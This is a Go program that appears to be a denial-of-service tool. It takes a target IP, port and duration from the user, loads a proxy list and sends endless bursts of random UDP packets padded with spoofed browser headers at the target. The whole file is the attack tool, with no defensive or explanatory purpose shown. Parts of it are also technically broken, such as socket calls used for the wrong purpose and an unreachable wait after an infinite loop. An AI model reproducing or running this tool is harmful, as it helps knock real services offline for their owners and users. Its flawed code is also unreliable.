package main

import (
	"bufio"
	"encoding/json"
	"fmt"
	"math/rand"
	"net"
	"net/http"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"
)

func main() {
	fmt.Print("Enter IP: ")
	ip := getInput()
	fmt.Print("Enter port: ")
	port, _ := strconv.Atoi(getInput())
	fmt.Print("Enter duration (seconds): ")
	duration, _ := strconv.Atoi(getInput())

	proxies, err := loadProxies("https://example.com/proxy-list")
	if err != nil {
		fmt.Println(err)
		return
	}

	if len(proxies) == 0 {
		proxies = []string{"localhost:8080"}
	}

	packetContents := make([]byte, 1250)
	rand.Read(packetContents)

	userAgents := []string{
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36",
	}
	referrers := []string{
		"https://www.google.com/",
		"https://www.youtube.com/",
		"https://www.facebook.com/",
	}
	headers := []string{
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
		"Accept-Language: en-US,en;q=0.9",
		"Cache-Control: max-age=0",
	}

	packetSize := 1250

	var wg sync.WaitGroup

	for {
		for _, proxy := range proxies {
			wg.Add(1)
			go func(proxy string) {
				defer wg.Done()
				ua := userAgents[rand.Intn(len(userAgents))]
				ref := referrers[rand.Intn(len(referrers))]
				hdr := headers[rand.Intn(len(headers))]
				sendUDPPacket(proxy, ip, port, packetContents, ua, ref, hdr)
			}(proxy)
		}
		time.Sleep(time.Duration(duration) * time.Second)
	}

	wg.Wait()
}

func loadProxies(apiLink string) ([]string, error) {
	resp, err := http.Get(apiLink)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	var proxies []string
	err = json.NewDecoder(resp.Body).Decode(&proxies)
	return proxies, err
}

func sendUDPPacket(proxy string, ip string, port int, packetContents []byte, userAgent string, referrer string, header string) {
	conn, err := net.Dial("udp", proxy)
	if err != nil {
		fmt.Println(err)
		return
	}
	defer conn.Close()

	srcPort := rand.Intn(65535)
	udpConn := conn.(*net.UDPConn)
	udpConn.SetWriteBuffer(srcPort)

	_, err = udpConn.Write(append(packetContents, []byte(userAgent+"\r\n"+referrer+"\r\n"+header+"\r\n")...))
	if err != nil {
		fmt.Println(err)
		return
	}

	addr, err := net.ResolveUDPAddr("udp", fmt.Sprintf("%s:%d", ip, port))
	if err != nil {
		fmt.Println(err)
		return
	}
	_, err = udpConn.WriteToUDP(packetContents, addr)
	if err != nil {
		fmt.Println(err)
		return
	}
}

func getInput() string {
	reader := bufio.NewReader(os.Stdin)
	input, _ := reader.ReadString('\n')
	return strings.TrimSpace(input)
}
